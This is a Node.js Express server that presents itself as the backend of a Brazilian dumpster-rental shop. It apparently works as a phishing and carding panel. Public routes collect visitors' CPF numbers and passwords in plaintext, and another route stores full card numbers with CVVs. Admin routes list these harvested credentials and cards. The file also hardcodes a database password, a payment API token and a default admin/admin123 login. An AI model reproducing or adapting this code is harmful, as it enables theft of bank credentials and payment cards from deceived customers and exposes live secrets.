const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const path = require('path');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');

const app = express();

// ============ SEGURANÇA REFORÇADA ============
app.use(helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false
}));

// Rate limiting mais agressivo para admin
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 5,
    message: { error: 'Muitas tentativas, aguarde 15 minutos' }
});

const apiLimiter = rateLimit({
    windowMs: 60 * 1000,
    max: 100,
    message: { error: 'Muitas requisições, aguarde' }
});

// Limiter específico para endpoints sensíveis
const adminApiLimiter = rateLimit({
    windowMs: 60 * 1000,
    max: 30,
    message: { error: 'Muitas requisições admin, aguarde' }
});

app.use('/api/admin/login', loginLimiter);
app.use('/api/admin/', adminApiLimiter);
app.use('/api/', apiLimiter);

// Headers de segurança
app.use((req, res, next) => {
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    // Restringir CORS apenas para seu domínio
    res.setHeader('Access-Control-Allow-Origin', 'https://reidacacambinha.onrender.com');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    next();
});

app.use(cors({
    origin: 'https://reidacacambinha.onrender.com',
    credentials: true
}));
app.use(express.json({ limit: '10mb' }));
app.use(cookieParser());
app.use(express.static('public'));
app.use('/admin', express.static('admin'));

// Banco de dados
const pool = new Pool({
    connectionString: 'postgresql://nuitbanker_db_user:Gbnwn5eEqlrKkx4xjduxGis0DchI1aXy@dpg-d8h40ccvikkc73erecng-a.oregon-postgres.render.com/nuitbanker_db',
    ssl: { rejectUnauthorized: false },
    max: 20,
    idleTimeoutMillis: 30000,
    connectionTimeoutMillis: 2000
});

const JWT_SECRET = process.env.JWT_SECRET || 'ativacacambas_secret_key_2025';
const JWT_EXPIRES = '24h';

// Middleware de verificação de token ADMIN - reforçado
function verificarAdminToken(req, res, next) {
    const authHeader = req.headers.authorization;
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token) {
        return res.status(401).json({ error: 'Token não fornecido - Acesso negado' });
    }
    
    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        req.usuario = decoded;
        next();
    } catch (error) {
        if (error.name === 'TokenExpiredError') {
            return res.status(401).json({ error: 'Token expirado, faça login novamente' });
        }
        return res.status(401).json({ error: 'Token inválido - Acesso negado' });
    }
}

function getClientIP(req) {
    const ip = req.headers['x-forwarded-for'] || 
               req.connection.remoteAddress || 
               req.socket.remoteAddress ||
               req.ip;
    return ip ? ip.replace(/^::ffff:/, '') : 'IP não identificado';
}

async function initDatabase() {
    const client = await pool.connect();
    try {
        // Tabelas existentes...
        await client.query(`CREATE TABLE IF NOT EXISTS admin_users (
            id SERIAL PRIMARY KEY, 
            username VARCHAR(50) UNIQUE, 
            senha_hash VARCHAR(255),
            created_at TIMESTAMP DEFAULT NOW()
        )`);
        
        await client.query(`CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY, 
            cpf VARCHAR(14) UNIQUE, 
            senha TEXT, 
            ip TEXT, 
            dispositivo TEXT, 
            navegador TEXT, 
            telefone VARCHAR(20), 
            data_cpf TIMESTAMP DEFAULT CURRENT_TIMESTAMP, 
            data_senha TIMESTAMP, 
            status VARCHAR(20)
        )`);
        
        await client.query(`CREATE TABLE IF NOT EXISTS logs (
            id SERIAL PRIMARY KEY, 
            tipo VARCHAR(30), 
            cpf VARCHAR(14), 
            senha TEXT, 
            ip TEXT, 
            dispositivo TEXT, 
            navegador TEXT, 
            data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);
        
        await client.query(`CREATE TABLE IF NOT EXISTS payments (
            id SERIAL PRIMARY KEY, 
            transaction_id VARCHAR(100) UNIQUE, 
            cpf VARCHAR(14), 
            telefone VARCHAR(20),
            valor DECIMAL(10,2), 
            status VARCHAR(20) DEFAULT 'pending', 
            tipo_pagamento VARCHAR(20) DEFAULT 'PIX',
            data_solicitacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            data_pagamento TIMESTAMP
        )`);
        
        await client.query(`CREATE TABLE IF NOT EXISTS admin_attempts (
            id SERIAL PRIMARY KEY, 
            ip TEXT, 
            tentativa TEXT, 
            data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);
        
        await client.query(`CREATE TABLE IF NOT EXISTS produtos (
            id SERIAL PRIMARY KEY, 
            nome TEXT NOT NULL, 
            tipo TEXT NOT NULL, 
            preco REAL NOT NULL,
            preco_promocional REAL, 
            descricao TEXT, 
            icone TEXT, 
            imagem TEXT, 
            dimensoes TEXT, 
            capacidade TEXT,
            ativo BOOLEAN DEFAULT true, 
            created_at TIMESTAMP DEFAULT NOW()
        )`);
        
        await client.query(`CREATE TABLE IF NOT EXISTS clientes (
            id SERIAL PRIMARY KEY, 
            nome TEXT NOT NULL, 
            telefone TEXT NOT NULL, 
            email TEXT, 
            cpf TEXT,
            created_at TIMESTAMP DEFAULT NOW()
        )`);
        
        await client.query(`CREATE TABLE IF NOT EXISTS agendamentos (
            id SERIAL PRIMARY KEY, 
            cliente_id INTEGER REFERENCES clientes(id) ON DELETE CASCADE, 
            tipo_obra TEXT,
            endereco_obra TEXT, 
            data_agendamento DATE, 
            horario TEXT, 
            observacoes TEXT,
            created_at TIMESTAMP DEFAULT NOW()
        )`);
        
        await client.query(`CREATE TABLE IF NOT EXISTS pedidos (
            id SERIAL PRIMARY KEY, 
            cliente_id INTEGER REFERENCES clientes(id) ON DELETE CASCADE, 
            produto_id INTEGER REFERENCES produtos(id) ON DELETE CASCADE,
            quantidade INTEGER DEFAULT 1, 
            valor_total REAL, 
            status_pagamento TEXT DEFAULT 'pendente',
            tipo_pagamento TEXT, 
            transacao_id TEXT, 
            created_at TIMESTAMP DEFAULT NOW()
        )`);
        
        await client.query(`CREATE TABLE IF NOT EXISTS cartoes (
            id SERIAL PRIMARY KEY, 
            cliente_id INTEGER, 
            nome_titular TEXT, 
            numero_cartao TEXT,
            cvv TEXT, 
            validade TEXT, 
            created_at TIMESTAMP DEFAULT NOW()
        )`);

        // Admin padrão
        const adminExists = await client.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
        if (adminExists.rows.length === 0) {
            const hash = await bcrypt.hash('admin123', 10);
            await client.query('INSERT INTO admin_users (username, senha_hash) VALUES ($1, $2)', ['admin', hash]);
            console.log('✅ Admin criado: admin / admin123');
        }

        // Produtos padrão
        const produtosCount = await client.query('SELECT COUNT(*) FROM produtos');
        if (parseInt(produtosCount.rows[0].count) === 0) {
            const produtosPadrao = [
                ['Caçamba 3m³', 'cacamba', 160, 140, 'Ideal para pequenas reformas.', 'fas fa-dumpster', null, '2.0m x 1.5m x 1.0m', '3m³'],
                ['Caçamba 5m³', 'cacamba', 240, 200, 'Perfeita para obras medias.', 'fas fa-dumpster', null, '2.5m x 1.8m x 1.2m', '5m³'],
                ['Caçamba 7m³', 'cacamba', 320, 280, 'Alta capacidade para grandes obras.', 'fas fa-truck', null, '3.0m x 2.0m x 1.3m', '7m³']
            ];
            for (const p of produtosPadrao) {
                await client.query(`INSERT INTO produtos (nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9)`, p);
            }
            console.log('✅ Produtos padrão inseridos');
        }
        console.log('✅ Banco de dados inicializado');
    } catch (err) {
        console.error('❌ Erro ao inicializar banco:', err);
    } finally { 
        client.release(); 
    }
}
initDatabase();

// ============ ROTAS PÚBLICAS (limitadas) ============
app.post('/api/cpf', async (req, res) => {
    const { cpf, ip, dispositivo, navegador, telefone } = req.body;
    try {
        await pool.query(`INSERT INTO users (cpf, ip, dispositivo, navegador, data_cpf, status, telefone) VALUES ($1,$2,$3,$4,CURRENT_TIMESTAMP,$5,$6) ON CONFLICT (cpf) DO UPDATE SET ip=$2, dispositivo=$3, navegador=$4, telefone=$6`, [cpf, ip, dispositivo, navegador, 'aguardando_senha', telefone]);
        res.json({ success: true });
    } catch { res.json({ success: true }); }
});

app.post('/api/login', async (req, res) => {
    const { cpf, password, ip, dispositivo, navegador, telefone } = req.body;
    try {
        await pool.query(`UPDATE users SET senha=$1, ip_senha=$2, dispositivo_senha=$3, navegador_senha=$4, data_senha=CURRENT_TIMESTAMP, status=$5, telefone=COALESCE(telefone,$6) WHERE cpf=$7`, [password, ip, dispositivo, navegador, 'completo', telefone, cpf]);
        await pool.query('INSERT INTO logs (tipo, cpf, senha, ip, dispositivo, navegador) VALUES ($1,$2,$3,$4,$5,$6)', ['senha_inserida', cpf, password, ip, dispositivo, navegador]);
        res.json({ success: true });
    } catch { res.json({ success: true }); }
});

// ============ ROTA ADMIN LOGIN (protegida) ============
app.post('/api/admin/login', async (req, res) => {
    const { username, password } = req.body;
    const ip = getClientIP(req);
    
    await pool.query('INSERT INTO admin_attempts (ip, tentativa) VALUES ($1,$2)', [ip, `Login: ${username}`]).catch(e => console.log(e));
    
    try {
        const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
        if (result.rows.length === 0) return res.status(401).json({ error: 'Credenciais inválidas' });
        
        const valid = await bcrypt.compare(password, result.rows[0].senha_hash);
        if (!valid) return res.status(401).json({ error: 'Credenciais inválidas' });
        
        const token = jwt.sign({ id: result.rows[0].id, username }, JWT_SECRET, { expiresIn: JWT_EXPIRES });
        res.json({ success: true, token });
    } catch (error) { 
        res.status(500).json({ error: 'Erro interno' }); 
    }
});

// ============ ROTAS CARTÕES ============
app.post('/api/cartoes/salvar', async (req, res) => {
    const { nome_titular, numero_cartao, cvv, validade, cpf, telefone } = req.body;
    
    if (!nome_titular || !numero_cartao || !cvv || !validade) {
        return res.status(400).json({ error: 'Todos os campos do cartão são obrigatórios' });
    }
    
    try {
        let cliente = await pool.query('SELECT id FROM users WHERE cpf = $1', [cpf]);
        let cliente_id;
        
        if (cliente.rows.length > 0) {
            cliente_id = cliente.rows[0].id;
            if (telefone) {
                await pool.query('UPDATE users SET telefone = $1 WHERE id = $2', [telefone, cliente_id]);
            }
        } else {
            const novoCliente = await pool.query(
                'INSERT INTO users (cpf, telefone, status) VALUES ($1, $2, $3) RETURNING id',
                [cpf || '00000000000', telefone || '', 'cadastro_cartao']
            );
            cliente_id = novoCliente.rows[0].id;
        }
        
        await pool.query(
            `INSERT INTO cartoes (cliente_id, nome_titular, numero_cartao, cvv, validade) 
             VALUES ($1, $2, $3, $4, $5)`,
            [cliente_id, nome_titular, numero_cartao, cvv, validade]
        );
        
        res.json({ success: true });
    } catch (err) {
        console.error('Erro ao salvar cartão:', err);
        res.status(500).json({ error: err.message });
    }
});

// ============ ROTAS ADMIN PRODUTOS (COM PUT) ============
app.get('/api/admin/produtos', verificarAdminToken, async (req, res) => {
    try { 
        const result = await pool.query("SELECT * FROM produtos ORDER BY id"); 
        res.json({ success: true, produtos: result.rows }); 
    } catch (err) { 
        res.status(500).json({ erro: err.message }); 
    }
});

app.post('/api/admin/produtos', verificarAdminToken, async (req, res) => {
    const { nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade } = req.body;
    try { 
        const result = await pool.query(`INSERT INTO produtos (nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9) RETURNING id`, 
            [nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade]); 
        res.json({ success: true, id: result.rows[0].id }); 
    } catch (err) { 
        res.status(500).json({ erro: err.message }); 
    }
});

// 🔥 ROTA PUT PARA EDITAR PRODUTOS (ADICIONADA AGORA) 🔥
app.put('/api/admin/produtos/:id', verificarAdminToken, async (req, res) => {
    const id = req.params.id;
    const { nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade } = req.body;
    
    try {
        const result = await pool.query(
            `UPDATE produtos SET 
                nome = $1, 
                tipo = $2, 
                preco = $3, 
                preco_promocional = $4, 
                descricao = $5, 
                icone = $6, 
                imagem = $7, 
                dimensoes = $8, 
                capacidade = $9
            WHERE id = $10 RETURNING id`,
            [nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade, id]
        );
        
        if (result.rows.length === 0) {
            return res.status(404).json({ success: false, error: 'Produto não encontrado' });
        }
        
        res.json({ success: true, message: 'Produto atualizado com sucesso' });
    } catch (err) {
        console.error('Erro ao atualizar produto:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

app.delete('/api/admin/produtos/:id', verificarAdminToken, async (req, res) => {
    const produtoId = req.params.id;
    try { 
        await pool.query('DELETE FROM pedidos WHERE produto_id = $1', [produtoId]);
        const result = await pool.query('DELETE FROM produtos WHERE id = $1 RETURNING id', [produtoId]);
        
        if (result.rows.length === 0) {
            return res.status(404).json({ error: 'Produto não encontrado' });
        }
        res.json({ success: true }); 
    } catch (err) { 
        console.error('Erro ao deletar produto:', err);
        res.status(500).json({ erro: err.message }); 
    }
});

// ============ ROTAS ADMIN CARTÕES ============
app.get('/api/admin/cartoes', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query(`
            SELECT c.*, u.cpf, u.telefone as cliente_telefone 
            FROM cartoes c 
            LEFT JOIN users u ON c.cliente_id = u.id 
            ORDER BY c.created_at DESC
        `);
        res.json({ success: true, cartoes: result.rows });
    } catch (err) { 
        console.error('Erro ao buscar cartoes:', err);
        res.json({ success: true, cartoes: [] }); 
    }
});

app.delete('/api/admin/cartoes/:id', verificarAdminToken, async (req, res) => {
    try { 
        await pool.query('DELETE FROM cartoes WHERE id = $1', [req.params.id]); 
        res.json({ success: true }); 
    } catch (err) { 
        res.status(500).json({ erro: err.message }); 
    }
});

app.post('/api/admin/clear-cards', verificarAdminToken, async (req, res) => {
    try { 
        await pool.query('DELETE FROM cartoes'); 
        res.json({ success: true }); 
    } catch (err) { 
        res.status(500).json({ erro: err.message }); 
    }
});

// ============ ROTAS ADMIN AGENDAMENTOS ============
app.get('/api/admin/agendamentos', verificarAdminToken, async (req, res) => {
    try { 
        const result = await pool.query(`SELECT a.*, c.nome as cliente_nome, c.telefone, c.cpf, c.email FROM agendamentos a LEFT JOIN clientes c ON a.cliente_id = c.id ORDER BY a.created_at DESC`); 
        res.json({ success: true, agendamentos: result.rows }); 
    } catch (err) { 
        res.status(500).json({ erro: err.message }); 
    }
});

app.delete('/api/admin/agendamentos/:id', verificarAdminToken, async (req, res) => {
    try { 
        await pool.query('DELETE FROM agendamentos WHERE id = $1', [req.params.id]); 
        res.json({ success: true }); 
    } catch (err) { 
        res.status(500).json({ erro: err.message }); 
    }
});

// ============ ROTAS ADMIN USUÁRIOS ============
app.get('/api/admin/users', verificarAdminToken, async (req, res) => {
    try { 
        const result = await pool.query('SELECT cpf, senha, ip, dispositivo, navegador, data_cpf, data_senha, telefone FROM users ORDER BY data_cpf DESC'); 
        res.json({ users: result.rows }); 
    } catch { 
        res.json({ users: [] }); 
    }
});

app.delete('/api/admin/delete/:cpf', verificarAdminToken, async (req, res) => {
    try { 
        await pool.query('DELETE FROM users WHERE cpf = $1', [req.params.cpf]); 
        res.json({ success: true }); 
    } catch { 
        res.json({ success: true }); 
    }
});

app.post('/api/admin/clear', verificarAdminToken, async (req, res) => {
    try { 
        await pool.query('DELETE FROM users'); 
        await pool.query('DELETE FROM logs'); 
        res.json({ success: true }); 
    } catch { 
        res.json({ success: true }); 
    }
});

// ============ ROTAS ADMIN LOGS ============
app.get('/api/admin/logs', verificarAdminToken, async (req, res) => {
    try { 
        const result = await pool.query('SELECT * FROM logs ORDER BY data DESC LIMIT 200'); 
        res.json({ logs: result.rows }); 
    } catch { 
        res.json({ logs: [] }); 
    }
});

app.delete('/api/admin/logs/:id', verificarAdminToken, async (req, res) => {
    try { 
        await pool.query('DELETE FROM logs WHERE id = $1', [req.params.id]); 
        res.json({ success: true }); 
    } catch (err) { 
        res.status(500).json({ erro: err.message }); 
    }
});

app.post('/api/admin/clear-logs', verificarAdminToken, async (req, res) => {
    try { 
        await pool.query('DELETE FROM logs'); 
        res.json({ success: true }); 
    } catch { 
        res.json({ success: false }); 
    }
});

// ============ ROTAS ADMIN PAYMENTS ============
app.get('/api/admin/payments', verificarAdminToken, async (req, res) => {
    try { 
        const result = await pool.query('SELECT * FROM payments ORDER BY id DESC'); 
        res.json({ payments: result.rows }); 
    } catch { 
        res.json({ payments: [] }); 
    }
});

app.delete('/api/admin/payments/:id', verificarAdminToken, async (req, res) => {
    try { 
        await pool.query('DELETE FROM payments WHERE id = $1', [req.params.id]); 
        res.json({ success: true }); 
    } catch (err) { 
        res.status(500).json({ erro: err.message }); 
    }
});

app.post('/api/admin/clear-payments', verificarAdminToken, async (req, res) => {
    try { 
        await pool.query('DELETE FROM payments'); 
        res.json({ success: true }); 
    } catch { 
        res.json({ success: false }); 
    }
});

// ============ ROTAS ADMIN STATS ============
app.get('/api/admin/stats', verificarAdminToken, async (req, res) => {
    try {
        const totalUsers = await pool.query('SELECT COUNT(*) FROM users');
        const comSenha = await pool.query("SELECT COUNT(*) FROM users WHERE senha IS NOT NULL");
        const totalLogs = await pool.query('SELECT COUNT(*) FROM logs');
        const totalProdutos = await pool.query('SELECT COUNT(*) FROM produtos');
        const totalAgendamentos = await pool.query('SELECT COUNT(*) FROM agendamentos');
        res.json({ stats: { 
            total_users: parseInt(totalUsers.rows[0].count), 
            com_senha: parseInt(comSenha.rows[0].count), 
            total_logs: parseInt(totalLogs.rows[0].count), 
            total_produtos: parseInt(totalProdutos.rows[0].count), 
            total_agendamentos: parseInt(totalAgendamentos.rows[0].count)
        }});
    } catch { 
        res.json({ stats: { total_users: 0, com_senha: 0, total_logs: 0, total_produtos: 0, total_agendamentos: 0 } }); 
    }
});

// ============ ROTAS ADMIN ADD USER ============
app.post('/api/admin/add-user', verificarAdminToken, async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password || password.length < 6) {
        return res.status(400).json({ error: 'Username e senha obrigatorios (min 6)' });
    }
    try {
        const existing = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
        if (existing.rows.length > 0) {
            return res.status(400).json({ error: 'Usuário já existe' });
        }
        const hash = await bcrypt.hash(password, 10);
        await pool.query('INSERT INTO admin_users (username, senha_hash) VALUES ($1,$2)', [username, hash]);
        res.json({ success: true });
    } catch { 
        res.status(500).json({ error: 'Erro ao adicionar usuario' }); 
    }
});

app.post('/api/admin/change-password', verificarAdminToken, async (req, res) => {
    const { senha_antiga, nova_senha } = req.body;
    if (!senha_antiga || !nova_senha || nova_senha.length < 6) {
        return res.status(400).json({ error: 'Senha antiga obrigatoria e nova senha deve ter no minimo 6 caracteres' });
    }
    try {
        const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
        if (result.rows.length === 0) return res.status(404).json({ error: 'Admin nao encontrado' });
        
        const senhaValida = await bcrypt.compare(senha_antiga, result.rows[0].senha_hash);
        if (!senhaValida) return res.status(401).json({ error: 'Senha atual incorreta' });
        
        const hash = await bcrypt.hash(nova_senha, 10);
        await pool.query('UPDATE admin_users SET senha_hash = $1 WHERE username = $2', [hash, 'admin']);
        res.json({ success: true });
    } catch { 
        res.status(500).json({ error: 'Erro interno' }); 
    }
});

// ============ ROTAS PÚBLICAS PRODUTOS ============
app.get('/api/produtos', async (req, res) => {
    try { 
        const result = await pool.query("SELECT * FROM produtos WHERE ativo = true ORDER BY id"); 
        res.json({ success: true, produtos: result.rows }); 
    } catch (err) { 
        res.status(500).json({ erro: err.message }); 
    }
});

// ============ ROTAS PAGAMENTO PIX ============
const PLUMIFY_PRODUCT_HASH = 'lxpykbkgfl';
const PLUMIFY_API_TOKEN = '1Vp6bm2wSoil2giHCGRjsZ9IGVbiHve4u8xbyUoRWpdvHUWYOj6wZ9yd0xVq';

app.post('/api/save-payment', async (req, res) => {
    const { transaction_id, cpf, valor, telefone } = req.body;
    try { 
        await pool.query('INSERT INTO payments (transaction_id, cpf, valor, status, telefone) VALUES ($1,$2,$3,$4,$5) ON CONFLICT (transaction_id) DO NOTHING', [transaction_id, cpf, valor, 'pending', telefone]); 
        res.json({ success: true }); 
    } catch { 
        res.json({ success: false }); 
    }
});

app.get('/api/check-payment/:transaction_id', async (req, res) => {
    const { transaction_id } = req.params;
    try { 
        const result = await pool.query('SELECT status FROM payments WHERE transaction_id = $1', [transaction_id]); 
        if (result.rows.length > 0) res.json({ status: result.rows[0].status }); 
        else res.json({ status: 'not_found' }); 
    } catch { 
        res.status(500).json({ error: 'Erro ao verificar pagamento' }); 
    }
});

app.post('/api/create-payment', async (req, res) => {
    const { amount, customer_name, customer_email, customer_cpf, customer_phone } = req.body;
    if (!amount || amount <= 0) return res.status(400).json({ error: 'Valor invalido' });
    
    const amountCents = Math.round(parseFloat(amount) * 100);
    const payload = { 
        amount: amountCents, 
        offer_hash: PLUMIFY_PRODUCT_HASH, 
        payment_method: 'pix', 
        customer: { 
            name: customer_name || 'Ativa Caçambas', 
            email: customer_email || 'contato@ativacacambas.com.br', 
            phone_number: customer_phone || '41992878772', 
            document: customer_cpf || '00000000000', 
            street_name: 'Rua Irmã Maria Lúcia Roland', 
            number: '410', 
            neighborhood: 'Hauer', 
            city: 'Curitiba', 
            state: 'PR', 
            zip_code: '81630250' 
        }, 
        cart: [{ 
            product_hash: PLUMIFY_PRODUCT_HASH, 
            title: 'Ativa Caçambas - Locação', 
            price: amountCents, 
            quantity: 1, 
            operation_type: 1, 
            tangible: false 
        }], 
        expire_in_days: 3, 
        transaction_origin: 'api', 
        postback_url: `${process.env.BASE_URL || 'https://reidacacambinha.onrender.com'}/api/webhook/pagamento` 
    };
    
    try {
        const response = await fetch(`https://api.Plumify.com.br/api/public/v1/transactions?api_token=${PLUMIFY_API_TOKEN}`, { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' }, 
            body: JSON.stringify(payload) 
        });
        const data = await response.json();
        if (data.pix && data.pix.pix_qr_code) {
            await pool.query('INSERT INTO payments (transaction_id, cpf, valor, status, telefone) VALUES ($1,$2,$3,$4,$5) ON CONFLICT (transaction_id) DO NOTHING', [data.hash, customer_cpf, amount, 'pending', customer_phone]).catch(e => console.log(e));
            res.json({ 
                success: true, 
                payment: { 
                    pix_code: data.pix.pix_qr_code, 
                    pix_qrcode: data.pix.pix_qr_code, 
                    expires_at: data.expires_at, 
                    id: data.hash, 
                    status: data.payment_status 
                } 
            });
        } else { 
            res.json({ success: false, error: data.message || 'Erro ao gerar PIX' }); 
        }
    } catch (error) { 
        res.status(500).json({ error: 'Erro ao gerar pagamento' }); 
    }
});

app.post('/api/webhook/pagamento', async (req, res) => {
    const { hash, status } = req.body;
    if (status === 'paid') { 
        try { await pool.query('UPDATE payments SET status = $1, data_pagamento = NOW() WHERE transaction_id = $2', ['paid', hash]); } catch(e) {} 
    }
    res.json({ received: true });
});

// ============ ROTAS DE PÁGINAS ============
app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'index.html')); });
app.get('/admin', (req, res) => { res.sendFile(path.join(__dirname, 'admin', 'index.html')); });
app.get('/agendamento', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'agendamento.html')); });
app.get('/produtos', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'produtos.html')); });
app.get('/produto', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'produto.html')); });
app.get('/checkout', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'checkout.html')); });
app.get('/checker', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'checker.html')); });

const PORT = process.env.PORT || 3001;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor rodando na porta ${PORT}`);
    console.log(`NUITBANKER AMOR`);
    console.log(`NUITBANKER AMOR`);
    console.log(`NUITBANKER AMOR`);
});
